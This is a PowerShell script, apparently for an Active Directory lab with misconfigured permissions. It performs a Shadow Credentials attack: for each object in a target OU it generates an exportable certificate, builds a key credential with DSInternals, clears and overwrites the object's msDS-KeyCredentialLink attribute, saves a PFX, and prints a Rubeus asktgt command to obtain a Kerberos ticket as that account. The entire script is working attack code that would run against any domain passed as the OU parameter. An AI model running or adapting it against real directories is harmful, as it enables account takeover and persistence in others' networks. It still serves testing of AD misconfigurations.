[CmdletBinding()]
param(
    [string]$OU = 'OU=ShadowCreds3,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan',
    [string]$TranscriptPath
)


if (-not $TranscriptPath) {
    $timestamp = Get-Date -Format "yyyyMMddHHmmss"
    $TranscriptPath = Join-Path -Path $PSScriptRoot -ChildPath "ShadowCredsTest-$timestamp.log"
}

$transcriptDirectory = Split-Path -Parent $TranscriptPath
if ($transcriptDirectory -and -not (Test-Path -LiteralPath $transcriptDirectory)) {
    New-Item -Path $transcriptDirectory -ItemType Directory -Force | Out-Null
}

Import-Module ActiveDirectory -ErrorAction Stop
Import-Module DSInternals -ErrorAction Stop


function New-KeyCredentialValue {
    param(
        [Microsoft.ActiveDirectory.Management.ADObject]$AdObject
    )

    if (-not $AdObject) {
        return $null
    }

    $certificateParams = @{
        Subject            = 'itdoesnotreallymatteratall'
        KeyLength          = 2048
        Provider           = 'Microsoft Strong Cryptographic Provider'
        CertStoreLocation  = 'Cert:\CurrentUser\My'
        NotAfter           = (Get-Date).AddYears(5)
        TextExtension      = @('2.5.29.19={text}false', '2.5.29.37={text}1.3.6.1.4.1.311.20.2.2')
        SuppressOid        = '2.5.29.14'
        KeyUsage           = 'None'
        KeyExportPolicy    = 'Exportable'
       # HashAlgorithm      = 'SHA256'
    }

    $certificate = New-SelfSignedCertificate @certificateParams
    if (-not $certificate) {
        Write-Warning ("    Unable to generate self-signed certificate for {0}; skipping key credential write." -f $AdObject.Name)
        return $null
    }

    $pfxFilePath = $null
    try {
        $pfxFilePath = Join-Path -Path (Get-Location).ProviderPath -ChildPath ("{0}.pfx" -f $AdObject.Name)
        $certCollection = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection
        [void]$certCollection.Add($certificate)
        $pfxBytes = $certCollection.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
        $encodedPfx = [Convert]::ToBase64String($pfxBytes)
        [System.IO.File]::WriteAllText($pfxFilePath, $encodedPfx)
    } catch {
        Write-Warning ("    Failed to export PFX for {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
    }

    try {
        $keyParams = @{
            Certificate = $certificate
            OwnerDN     = $AdObject.DistinguishedName
            IsComputerKey = $true
        }

        $ngcKey = Get-ADKeyCredential @keyParams
        if (-not $ngcKey) {
            Write-Warning ("    Unable to create key credential for {0}." -f $AdObject.Name)
            return $null
        }

        if ($pfxFilePath) {
            $ngcKey = $ngcKey | Add-Member -MemberType NoteProperty -Name PfxFilePath -Value $pfxFilePath -PassThru
        }

        return $ngcKey
    } catch {
        Write-Warning ("    Failed to build key credential value for {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
        return $null
    } finally {
        if ($certificate) {
            try {
                Remove-Item -LiteralPath ("Cert:\CurrentUser\My\{0}" -f $certificate.Thumbprint) -Force -ErrorAction SilentlyContinue
            } catch {
                Write-Verbose ("Unable to remove temporary certificate {0}: {1}" -f $certificate.Thumbprint, $_.Exception.Message)
            }
        }
    }
}

function Invoke-KeyCredentialWriteTest {
    param(
        [Microsoft.ActiveDirectory.Management.ADObject]$AdObject
    )

    $dn = $AdObject.DistinguishedName
    $sam = $AdObject.SamAccountName
    $keyCredentialValue = New-KeyCredentialValue -AdObject $AdObject
    if (-not $keyCredentialValue) {
        Write-Warning ("    Failed to construct DN-Binary value for {0}; skipping msDS-KeyCredentialLink write." -f $AdObject.Name)
        return
    }

    $addSucceeded = $false
    $key = $keyCredentialValue.ToDNWithBinary()
    $keyString = $keyCredentialValue.ToString()
    Write-Host "    Key: $key"
    Write-Host "    Type: $($key.Gettype())"
    try {


        Set-ADObject -Identity $dn -Clear 'msDS-KeyCredentialLink' -Add @{ 'msDS-KeyCredentialLink' = $key } -ErrorAction Stop -Verbose
        $addSucceeded = $true
        Write-Host "    Added msDS-KeyCredentialLink: $keyString"
    } catch {
        Write-Warning ("    Failed to modify msDS-KeyCredentialLink on {0}: {1}" -f $AdObject.Name, $_.Exception.Message)
    } finally {
        if ($addSucceeded) {
            $pfxPath = $null
            if ($keyCredentialValue -and $keyCredentialValue.PSObject.Properties['PfxFilePath']) {
                $pfxPath = $keyCredentialValue.PSObject.Properties['PfxFilePath'].Value
            }

            $domainComponents = ($dn -split ',') | Where-Object { $_ -like 'DC=*' } | ForEach-Object { $_.Substring(3) }
            $domainName = ($domainComponents -join '.')
            if (-not $domainName) {
                try {
                    $domainName = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
                } catch {
                    $domainName = $null
                }
            }

            if ($pfxPath -and $domainName) {
                $rubeusCommand = "Rubeus.exe asktgt /user:{0} /domain:{1} /certificate:'{2}' /show" -f $sam, $domainName, $pfxPath
                Write-Host ("    Run the following in Rubeus to request a TGT:`n        {0}" -f $rubeusCommand)
            } else {
                Write-Warning ("    Unable to build the Rubeus command because the PFX path or domain name is missing.")
            }
        }
    }
}

function Write-CurrentTokenInfo {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Host "User Identity: $($identity.Name)"
    Write-Host "Authentication Type: $($identity.AuthenticationType)"
    Write-Host "Impersonation Level: $($identity.ImpersonationLevel)"
    Write-Host "SID: $($identity.User.Value)"

    Write-Host "Group Membership (token):"
    $groupInfo = foreach ($groupSid in $identity.Groups) {
        $name = $null
        try {
            $name = $groupSid.Translate([System.Security.Principal.NTAccount]).Value
        } catch {
            $name = "(unresolved)"
        }

        [PSCustomObject]@{
            Name       = $name
            SID        = $groupSid.Value
            Attributes = $groupSid.Attributes
        }
    }

    if ($groupInfo) {
        $groupInfo | Format-Table -AutoSize
    } else {
        Write-Host "    (No groups)"
    }
}

$propertiesToLoad = @(
    'objectClass',
    'dNSHostName',
    'msDS-AdditionalDnsHostName',
    'servicePrincipalName',
    'msDS-KeyCredentialLink',
    'samAccountName',
    'msDS-AdditionalSamAccountName',
    'objectSid',
    'nTSecurityDescriptor',
    'msDS-KeyCredentialLink'
)

$rawObjects = Get-ADObject -SearchBase $OU -SearchScope OneLevel -Filter * -Properties $propertiesToLoad -ErrorAction Stop | Sort-Object -Property Name

$transcriptStarted = $false
try {
    Start-Transcript -Path $TranscriptPath -Force
    $transcriptStarted = $true

        if (-not $rawObjects) {
        Write-Warning "No ValidatedWrite test objects were located in $OU."
        return
    }

    Write-Host ("=" * 60)
    Write-Host "Current user token information:"
    Write-CurrentTokenInfo

    foreach ($object in $rawObjects) {
        Write-Host ("=" * 60)
        Write-Host ("Processing {0}" -f $object.Name)
        Write-Host ("DistinguishedName: {0}" -f $object.DistinguishedName)
        Invoke-KeyCredentialWriteTest $object
        Get-ADObject -Identity $object.DistinguishedName -Properties msDS-KeyCredentialLink
    }

} finally {
    if ($transcriptStarted) {
        Stop-Transcript
    }
}
